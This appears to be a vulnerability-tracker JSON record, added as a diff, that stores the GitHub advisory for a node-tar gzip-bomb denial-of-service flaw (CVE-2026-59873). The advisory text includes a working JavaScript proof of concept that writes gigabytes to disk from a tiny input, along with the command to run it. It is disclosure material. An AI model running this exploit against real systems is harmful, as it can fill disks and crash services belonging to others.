@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/109031036?v=4\", \"events_url\": \"https://api.github.com/users/Jvr2022/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Jvr2022/followers\", \"following_url\": \"https://api.github.com/users/Jvr2022/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Jvr2022/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Jvr2022\", \"id\": 109031036, \"login\": \"Jvr2022\", \"node_id\": \"U_kgDOBn-ufA\", \"organizations_url\": \"https://api.github.com/users/Jvr2022/orgs\", \"received_events_url\": \"https://api.github.com/users/Jvr2022/received_events\", \"repos_url\": \"https://api.github.com/users/Jvr2022/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Jvr2022/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Jvr2022/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Jvr2022\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-59873\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 9.2, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H\"}}, \"cwes\": [{\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary\\nA **Decompression/parse DoS via unlimited input** vulnerability in `node-tar` allows an attacker to exhaust server resources (disk space and CPU). Because the library does not enforce hard upper bounds on total decompressed data or entry counts, a small, maliciously crafted \\\"Gzip Bomb\\\" can be used to fill a server's storage and crash services.\\n\\n### Details\\nThe `node-tar` library does not enforce a hard upper bound on archive size or the volume of decompressed data processed during extraction. While the `maxReadSize` option exists, it only controls internal read chunk sizes (default 16MB) and does not limit the total cumulative bytes written to disk.\\n\\nSpecifically, in `src/extract.ts`, the `Unpack` stream processes entries as they arrive. There is no total-bytes limit, entry-count limit, or decompression ratio guard. An attacker can provide a TAR header claiming a massive file size (e.g., 10GB) and follow it with highly compressible data (like zeros). `node-tar` will continue to extract and write this data until the physical disk is exhausted, as it lacks a mechanism to abort based on global resource consumption.\\n\\n### PoC\\nThe following Proof of Concept demonstrates how a tiny compressed input can be expanded into gigabytes of data on the host machine almost instantly.\\n\\n1. Create the exploit script:\\n```javascript\\nconst fs = require('fs'), z = require('zlib'), t = require('tar');\\n\\nconst d = 'dos_test';\\nif (fs.existsSync(d)) fs.rmSync(d, {recursive:true});\\nfs.mkdirSync(d);\\n\\n// Build 10GB header\\nconst h = Buffer.alloc(512);\\nh.write('payload');\\nh.write((10*1024**3).toString(8).padStart(11,'0'), 124); \\nh.write('ustar', 257);\\nlet s = 256;\\nfor(let i=0;i<512;i++) if(i<148||i>155) s+=h[i];\\nh.write(s.toString(8).padStart(6,'0'), 148);\\n\\nconst gz = z.createGzip();\\ngz.pipe(t.x({cwd: d}));\\ngz.write(h);\\n\\nconst b = Buffer.alloc(32 * 1024 * 1024); // 32MB chunks for speed\\n\\nconst run = () => {\\n  while (gz.write(b));\\n  gz.once('drain', run);\\n};\\n\\nconst monitor = setInterval(() => {\\n    try {\\n        const bytes = fs.statSync(`${d}/payload`).size;\\n        const mb = Math.floor(bytes / (1024 * 1024));\\n        process.stdout.write(`\\\\r[>] Extracted: ${mb} MB`);\\n        \\n        if (mb > 5000) { \\n            console.log('\\\\n[!] VULN CONFIRMED: 5GB+ written from tiny input.'); \\n            process.exit(); \\n        }\\n    } catch {}\\n}, 50);\\n\\nprocess.on('exit', () => {\\n    clearInterval(monitor);\\n    console.log('[*] Cleaning up...');\\n    if (fs.existsSync(d)) fs.rmSync(d, {recursive:true, force:true});\\n});\\n\\nrun();\\n```\\n\\n2. Run the PoC:\\n```bash\\nnode poc.js\\n```\\n\\n**Observation:** You will see the extracted size rapidly climb to 5,000 MB+ within seconds, while the actual data being \\\"sent\\\" through the gzip stream is negligible.\\n\\n### Impact\\nThis is a **Denial of Service (DoS)** vulnerability. It impacts any application or service that uses `node-tar` to extract archives provided by untrusted users (e.g., npm registries, CI/CD pipelines, or file-sharing platforms). An unauthenticated attacker can send a small payload that expands to consume all available disk space, leading to system-wide failure and service outages.\", \"epss\": {\"percentage\": 0.00358, \"percentile\": 0.27937}, \"ghsa_id\": \"GHSA-23hp-3jrh-7fpw\", \"github_reviewed_at\": \"2026-07-20T21:52:03Z\", \"html_url\": \"https://github.com/advisories/GHSA-23hp-3jrh-7fpw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-23hp-3jrh-7fpw\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-59873\"}], \"nvd_published_at\": \"2026-07-08T16:16:33Z\", \"published_at\": \"2026-07-20T21:52:03Z\", \"references\": [\"https://github.com/isaacs/node-tar/security/advisories/GHSA-23hp-3jrh-7fpw\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-59873\", \"https://github.com/isaacs/node-tar/commit/2812e9338665659b183aa7226518c307044957d3\", \"https://github.com/isaacs/node-tar/releases/tag/v7.5.19\", \"https://github.com/advisories/GHSA-23hp-3jrh-7fpw\"], \"repository_advisory_url\": \"https://api.github.com/repos/isaacs/node-tar/security-advisories/GHSA-23hp-3jrh-7fpw\", \"severity\": \"critical\", \"source_code_location\": \"https://github.com/isaacs/node-tar\", \"summary\": \"node-tar: Decompression/parse DoS via unlimited input\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-20T21:52:04Z\", \"url\": \"https://api.github.com/advisories/GHSA-23hp-3jrh-7fpw\", \"vulnerabilities\": [{\"first_patched_version\": \"7.5.19\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"tar\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 7.5.18\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-23hp-3jrh-7fpw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "tar: <= 7.5.18"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-59873"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "tar"
+    ],
+    "remote": true,
+    "vendor_severity": "critical"
+  },
+  "first_seen_at": "2026-07-22T00:50:30.233410Z",
+  "provenance": {
+    "content_sha256": "13fd9680f5cb2daef92d3b9181d9ca0d12985be627c4b7c7e8d50cbae9fdecd7",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-20T21:52:03Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-23hp-3jrh-7fpw",
+  "status": "active",
+  "title": "node-tar: Decompression/parse DoS via unlimited input",
+  "updated_at": "2026-07-20T21:52:04Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-23hp-3jrh-7fpw"
+}
